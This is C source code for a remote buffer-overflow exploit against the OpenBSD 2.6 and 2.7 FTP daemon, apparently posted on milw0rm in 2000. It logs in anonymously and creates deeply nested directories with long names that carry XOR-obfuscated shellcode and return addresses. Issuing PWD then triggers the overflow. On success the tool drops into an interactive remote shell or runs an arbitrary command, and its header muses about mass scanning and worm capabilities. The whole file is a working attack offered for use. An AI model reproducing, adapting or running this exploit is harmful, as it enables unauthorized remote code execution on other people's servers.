/*
   h0h0h0 0-day k0d3z
   Exploit by Scrippie, help by dvorak and jimjones

   greets to sk8

   Not fully developt exploit but it works most of the time ;)

   Things to add:
      - automatic writeable directory finding
      - syn-scan option to do mass-scanning
      - worm capabilities? (should be done seperatly using the -C option

   11/13/2000
*/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>


void usage(char *program);
char *strcreat(char *, char *, int);
char *longToChar(unsigned long);
char *xrealloc(void *, size_t);
void xfree(char **ptr);
char *xmalloc(size_t);
int xconnect(char *host, u_short port);
void xsend(int fd, char *buf);
void xsendftpcmd(int fd, char *command, char *param);
void xrecieveall(int fd, char *buf, int size);
void xrecieve(int fd, char *buf, int size);
void ftp_login(int fd, char *user, char *password);
void exploit(int fd);

int verbose = 0;


/*
   Written by dvorak, garbled up by "Smegma" with a word xor 0xaabb mask
   to get rid of dots and slashes.
*/

char heavenlycode[] =
"\x31\xc0\x89\xc1\x80\xc1\x02\x51\x50\x04\x5a\x50\xcd\x80"
"\xeb\x10\x5e\x31\xc9\xb1\x4a\x66\x81\x36\xbb\xaa\x46\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xff\xff\xff\x50\xcf\xe5\x9b\x7b\xf
a\xbf\xbd\xeb\x67\x3b\xfc\x8a\x6a\x33\xec\xba\xae\x33\xfa\x76\x2a\x8a\x6a\xeb\x22\xfd\xb5\x36\xf4\xa5\xf9\xbf\xaf\xeb\x67\x3b\x2
3\x7a\xfc\x8a\x6a\xbf\x97\xeb\x67\x3b\xfb\x8a\x6a\xbf\xa4\xf3\xfa\x76\x2a\x36\xf4\xb9\xf9\x8a\x6a\xbf\xa6\xeb\x67\x3b\x27\xe5\xb
4\xe8\x9b\x7b\xae\x86\xfa\x76\x2a\x8a\x6a\xeb\x22\xfd\x8d\x36\xf4\x93\xf9\x36\xf4\x9b\x23\xe5\x82\x32\xec\x97\xf9\xbf\x91\xeb\x6
7\x3b\x42\x2d\x55\x44\x55\xfa\xeb\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x85\x95\x84\x94\x84\x95\x8
5\x95\x84\x94\x84\x95\xeb\x94\xc8\xd2\xc4\x94\xd9\xd3";

char user[255] = "anonymous";
char pass[255] = "anonymous@abc.com";
char write_dir[PATH_MAX] = "/";
int ftpport = 21;
unsigned long int ret_addr = 0;
#define CMD_LOCAL 0
#define CMD_REMOTE 1
int command_type = -1;
char *command = NULL;

struct typeT {
        char *name;
        unsigned long int ret_addr;
};

#define NUM_TYPES 2
struct typeT types[NUM_TYPES] = {
        "OpenBSD 2.6", 0xdfbfd0ac,
        "OpenBSD 2.7", 0xdfbfd0ac};

void
usage(char *program)
{
        int i;
        fprintf(stderr,
                "\nUsage: %s [-h host] [-f port] [-u user] [-p pass] [-d directory] [-t type]\n\t\t[-r retaddr] [-c command] 
[-C command]\n\n"
                "Directory should be an absolute path, writable by the user.\n"
                "The argument of -c will be executed on the remote host\n"
                "while the argument of -C will be executed on the local\n"
                "with its filedescriptors connected to the remote host\n"
                "Valid types:\n",
                program);
        for (i = 0; i < NUM_TYPES; i++) {
                printf("%d : %s\n", i,  types[i].name);
        }
        exit(-1);
}


main(int argc, char **argv)
{
        unsigned int i;
        int opt, fd;
        unsigned int type = 0;
        char *hostname = "localhost";

        if (argc < 2)
                usage(argv[0]);

        while ((opt = getopt(argc, argv, "h:r:u:f:d:t:vp:c:C:")) != -1) {
                switch (opt) {
                case 'h':
                        hostname = optarg;
                        break;
                case 'C':
                        command = optarg;
                        command_type = CMD_LOCAL;
                        break;
                case 'c':
                        command = optarg;
                        command_type = CMD_REMOTE;
                        break;
                case 'r':
                        ret_addr = strtoul(optarg, NULL, 0);
                        break;
                case 'v':
                        verbose++;
                        break;
                case 'f':
                        if (!(ftpport = atoi(optarg))) {
                                fprintf(stderr, "Invalid destination port - %s\n", optarg);
                                exit(-1);
                        }
                        exit(-1);
                        break;
                case 'u':
                        strncpy(user, optarg, sizeof(user) - 1);
                        user[sizeof(user) - 1] = 0x00;
                        break;
                case 'p':
                        strncpy(pass, optarg, sizeof(pass) - 1);
                        pass[sizeof(pass) - 1] = 0x00;
                        break;
                case 'd':
                        strncpy(write_dir, optarg, sizeof(write_dir) - 1);
                        write_dir[sizeof(write_dir) - 1] = 0x00;
                        if ((write_dir[0] != '/')) 
                                usage(argv[0]);
                        if ((write_dir[strlen(write_dir) - 1] != '/'))
                                strncat(write_dir, "/", sizeof(write_dir) - 1);
                        break;
                case 't':
                        type = atoi(optarg);
                        if (type > NUM_TYPES)
                                usage(argv[0]);
                        break;
                default:
                        usage(argv[0]);
                }
        }

        if (ret_addr == 0)
                ret_addr = types[type].ret_addr;
        if ((fd = xconnect(hostname, ftpport)) == -1)
                exit(-1);
        else
                printf("Connected to remote host! Sending evil codes.\n");


        ftp_login(fd, user, pass);
        exploit(fd);


}

int
ftp_cmd_err(int fd, char *command, char *param, char *res, int size, char * msg)
{
        xsendftpcmd(fd, command, param);
        xrecieveall(fd, res, size);

        if (res == NULL)
                return 0;
        if (verbose)
                printf("%s\n", res);
        if (msg && (res[0] != '2')) {
                fprintf(stderr, "%s\n", msg);
                exit(-1);
        }
        return (res[0] != '2');
}

void shell(int fd)
{
        fd_set readfds;
        char buf[1];
        char *tst = "echo ; echo ; echo HAVE FUN ; id ; uname -a\n";

        write(fd, tst, strlen(tst));
        while (1) {
                FD_ZERO(&readfds);
                FD_SET(0, &readfds);
                FD_SET(fd, &readfds);
                select(fd + 1, &readfds, NULL, NULL, NULL);
                if (FD_ISSET(0, &readfds)) {
                        if (read(0, buf, 1) != 1) {
                                perror("read");
                                exit(1);
                        }
                        write(fd, buf, 1);
                }
                if (FD_ISSET(fd, &readfds)) {
                        if (read(fd, buf, 1) != 1) {
                                perror("read");
                                exit(1);
                        }
                        write(1, buf, 1);
                }
        }
}

void do_command(int fd)
{
        char buffer[1024];
        int len;

        if (command_type == CMD_LOCAL) {
                dup2(fd, 0);
                dup2(fd, 1);
                dup2(fd, 2);
                execl(command, command, NULL);
                exit (2);
        }
        write(fd, command, strlen(command));
        write(fd, "\n", 1);
        while ((len = read(fd, buffer, sizeof(buffer))) > 0) {
                write(1, buffer, len);
        }
        exit (0);
}

void execute_command(fd) 
{
}

int exploit_ok(int fd)
{
        char result[1024];
        xsend(fd, "id\n");

        xrecieve(fd, result, sizeof(result));
        return (strstr(result, "uid=") != NULL);
}

void exploit(int fd)
{
        char res[1024];
        int heavenlycode_s;
        char *dir = NULL;

        ftp_cmd_err(fd, "CWD", write_dir, res, 1024, "Can't CWD to write_dir");

        dir = strcreat(dir, "A", 255 - strlen(write_dir));
        ftp_cmd_err(fd, "MKD", dir, res, 1024, NULL);
        ftp_cmd_err(fd, "CWD", dir, res, 1024, "Can't change to directory");
        xfree(&dir);

        /* next on = 256 */

        dir = strcreat(dir, "A", 255);
        ftp_cmd_err(fd, "MKD", dir, res, 1024, NULL);
        ftp_cmd_err(fd, "CWD", dir, res, 1024, "Can't change to directory");
        xfree(&dir);
        /* next on = 512 */

        heavenlycode_s = strlen(heavenlycode);
        dir = strcreat(dir, "A", 254 - heavenlycode_s);
        dir = strcreat(dir, heavenlycode, 1);
        ftp_cmd_err(fd, "MKD", dir, res, 1024, NULL);
        ftp_cmd_err(fd, "CWD", dir, res, 1024, "Can't change to directory");
        xfree(&dir);
        /* next on = 768 */

        dir = strcreat(dir, longToChar(ret_addr), 252 / 4);
        ftp_cmd_err(fd, "MKD", dir, res, 1024, NULL);
        ftp_cmd_err(fd, "CWD", dir, res, 1024, "Can't change to directory");
        xfree(&dir);
        /* length = 1020 */

        /* 1022 moet " zijn */
        dir = strcreat(dir, "AAA\"", 1);
        ftp_cmd_err(fd, "MKD", dir, res, 1024, NULL);
        ftp_cmd_err(fd, "CWD", dir, res, 1024, "Can't change to directory");
        xfree(&dir);

        /* and tell it to blow up */
        ftp_cmd_err(fd, "PWD", NULL, res, 1024, NULL);

        if (!exploit_ok(fd)) {
                if (command != NULL) {
                        exit (2);
                } 
                fprintf(stderr, "Exploit failed\n");
                exit (1);
        }
        if (command == NULL)
                shell(fd);
        else
                do_command(fd);
}


char *
strcreat(char *dest, char *pattern, int repeat)
{
        char *ret;
        size_t plen, dlen = 0;
        int i;

        if (dest)
                dlen = strlen(dest);
        plen = strlen(pattern);

        ret = (char *) xrealloc(dest, dlen + repeat * plen + 1);

        if (!dest)
                ret[0] = 0x00;

        for (i = 0; i < repeat; i++) {
                strcat(ret, pattern);
        }
        return (ret);
}

char *
longToChar(unsigned long blaat)
{
        char *ret;

        ret = (char *) xmalloc(sizeof(long) + 1);
        memcpy(ret, &blaat, sizeof(long));
        ret[sizeof(long)] = 0x00;

        return (ret);
}

char *
xrealloc(void *ptr, size_t size)
{
        char *wittgenstein_was_a_drunken_swine;

        if (!(wittgenstein_was_a_drunken_swine = (char *) realloc(ptr, size))) {
                fprintf(stderr, "Cannot calculate universe\n");
                exit(-1);
        }
        return (wittgenstein_was_a_drunken_swine);
}

void
xfree(char **ptr)
{
        if (!ptr || !*ptr)
                return;
        free(*ptr);
        *ptr = NULL;
}

char *
xmalloc(size_t size)
{
        char *heidegger_was_a_boozy_beggar;

        if (!(heidegger_was_a_boozy_beggar = (char *) malloc(size))) {
                fprintf(stderr, "Out of cheese error\n");
                exit(-1);
        }
        return (heidegger_was_a_boozy_beggar);
}


int
xconnect(char *host, u_short port)
{
        struct hostent *he;
        struct sockaddr_in s_in;
        int fd;

        if ((he = gethostbyname(host)) == NULL) {
                perror("gethostbyname");
                return (-1);
        }
        memset(&s_in, 0, sizeof(s_in));
        s_in.sin_family = AF_INET;
        s_in.sin_port = htons(port);
        memcpy(&s_in.sin_addr.s_addr, he->h_addr, he->h_length);

        if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
                perror("socket");
                return (-1);
        }
        if (connect(fd, (const struct sockaddr *) & s_in, sizeof(s_in)) == -1) {
                perror("connect");
                return (-1);
        }
        return fd;
}

/* returns status from ftpd */
void
ftp_login(int fd, char *user, char *password)
{
        char reply[512];
        int rep;
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose) {
                printf("Logging in ..\n");
                printf("%s\n", reply);
        }
        xsendftpcmd(fd, "USER", user);
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose)
                printf("%s\n", reply);
        xsendftpcmd(fd, "PASS", password);
        xrecieveall(fd, reply, sizeof(reply));
        if (verbose)
                printf("%s\n", reply);

        if (reply[0] != '2') {
                printf("Login failed.\n");
                exit(-1);
        }
}

void
xsendftpcmd(int fd, char *command, char *param)
{
        xsend(fd, command);

        if (param != NULL) {
                xsend(fd, " ");
                xsend(fd, param);
        }
        xsend(fd, "\r\n");
}


void
xsend(int fd, char *buf)
{

        if (send(fd, buf, strlen(buf), 0) != strlen(buf)) {
                perror("send");
                exit(-1);
        }
}

void
xrecieveall(int fd, char *buf, int size)
{
        char scratch[6];

        if (buf == NULL || size == 0) {
                buf = scratch;
                size = sizeof(scratch);
        }
        memset(buf, 0, size);
        do {
                xrecieve(fd, buf, size);
        } while (buf[3] == '-');
}
/* recieves a line from the ftpd */
void
xrecieve(int fd, char *buf, int size)
{
        char *end;
        char ch;

        end = buf + size;

        while (buf < end) {
                if (read(fd, buf, 1) != 1) {
                        perror("read"); /* XXX */
                        exit(-1);
                }
                if (buf[0] == '\n') {
                        buf[0] = '\0';
                        return;
                }
                if (buf[0] != '\r') {
                        buf++;
                }
        }
        buf--;
        while (read(fd, buf, 1) == 1) {
                if (buf[0] == '\n') {
                        buf[0] = '\0';
                        return;
                }
        }
        perror("read");         /* XXX */
        exit(-1);
}


// milw0rm.com [2000-12-20]
